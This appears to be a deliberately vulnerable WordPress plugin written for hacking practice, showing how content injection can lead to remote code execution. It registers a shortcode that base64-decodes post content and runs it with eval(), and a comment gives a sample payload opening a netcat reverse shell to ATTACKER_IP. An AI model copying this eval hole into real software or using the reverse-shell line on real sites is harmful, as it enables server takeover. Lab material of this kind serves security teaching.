<?php
/**
 * Plugin Name: RCE Vulnerable Plugin
 * Description: An intentionally vulnerable plugin to demonstrate chaining a Content Injection to RCE.
 * Version: 1.0
 * Author: Ethical Hacking Student
 */

if ( ! defined( 'ABSPATH' ) ) {
    exit; // Exit if accessed directly.
}

/**
 * A shortcode that is vulnerable to PHP code injection via eval().
 *
 * Example of use in an exploit chain:
 * 1. Attacker uses a content injection vulnerability to create a post.
 * 2. The post content includes: [vulnerable_shortcode]system('nc -e /bin/bash ATTACKER_IP 4444');[/vulnerable_shortcode]
 * 3. When the post is viewed, this shortcode executes, opening a reverse shell.
 *
 * @param array $atts Shortcode attributes.
 * @param string|null $content The content enclosed by the shortcode.
 * @return mixed The result of the executed code.
 */
function vulnerable_shortcode_func($atts, $content = null) {
    // WARNING: This is a blatant, educational-purpose-only vulnerability.
    // Do NOT use this in a production environment.
    if (isset($content) && !empty(trim($content))) {
        // The payload is expected to be base64 encoded to bypass WP sanitization.
        $decoded_payload = base64_decode($content);
        if ($decoded_payload) {
            // Execute the decoded payload.
            eval($decoded_payload);
            return "Payload executed.";
        }
        return "Invalid base64 payload.";
    }
    return 'No payload provided.';
}
add_shortcode('vulnerable_shortcode', 'vulnerable_shortcode_func'); 